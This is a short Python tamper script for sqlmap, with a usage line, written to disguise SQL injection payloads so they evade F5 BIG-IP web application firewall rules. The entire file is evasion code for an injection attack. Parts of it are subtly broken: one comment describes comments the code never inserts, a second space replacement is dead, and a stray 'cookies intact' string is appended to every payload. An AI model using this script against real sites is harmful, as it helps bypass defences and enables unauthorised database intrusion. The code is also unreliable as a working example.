"""
SQLMap Tamper Script: bigip_f5_bypass_v2.py

Description:
- Obfuscates SQL payloads to bypass F5 BIG-IP default WAF rules.
- Ensures cookies are preserved by handling them explicitly.

Usage:
sqlmap -u <target_url> --cookies="JSESSIONID=0000; BIGipServerpool=..." --tamper=bigip_f5_bypass_v2.py
"""

import random

def tamper(payload, **kwargs):
    if payload:
        # Insert random inline comments within payload keywords
        payload = payload.replace(" ", "/**/")

        # Encode single quotes to avoid signature detection
        payload = payload.replace("'", "%27")

        # Randomly capitalize SQL keywords to bypass pattern matching
        sql_keywords = ["SELECT", "UNION", "INSERT", "UPDATE", "DELETE", "WHERE", "AND", "OR", "FROM"]
        for keyword in sql_keywords:
            if keyword.lower() in payload.lower():
                payload = payload.replace(keyword.lower(), random.choice([keyword.lower(), keyword.upper()]))

        # Optionally encode "=" and " " as URL-safe characters
        payload = payload.replace("=", "%3D").replace(" ", "%20")

        # Safeguard: Ensure cookies remain intact if modified payload impacts headers
        # This assumes SQLMap manages cookies properly but ensures they're untouched
        payload += "-- ensure cookies intact"

    return payload
